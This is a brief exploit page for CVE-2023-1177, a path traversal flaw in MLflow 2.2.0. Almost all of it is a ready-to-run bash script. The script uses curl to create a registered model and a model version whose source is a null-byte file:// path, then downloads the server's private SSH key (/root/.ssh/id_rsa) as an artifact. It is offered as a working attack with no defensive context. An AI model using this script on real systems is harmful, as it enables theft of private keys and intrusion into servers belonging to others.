#############
CVE-2023-1177
#############

|
| MLFlow Path Traversal
| Tested on MLflow 2.2.0
| src: https://github.com/iumiro/CVE-2023-1177-MLFlow
|

.. code-block:: bash

  #!/bin/bash
  RAND="EXPLOIT-$((1+$RANDOM%9999))"
  URL="http://172.17.0.2:6001"
  FILE='/root/.ssh/id_rsa'
  curl -vX POST "$URL/ajax-api/2.0/mlflow/registered-models/create" -d "{\"name\":\"$RAND\"}" -H "Content-Type: application/json"
  curl -vX POST "$URL/ajax-api/2.0/mlflow/model-versions/create" -d "{\"name\":\"$RAND\",\"source\":\"file://%00${FILE%/*}/\"}" -H "Content-Type: application/json"
  curl -v "$URL/model-versions/get-artifact?path=${FILE##*/}&name=$RAND&version=1"

|
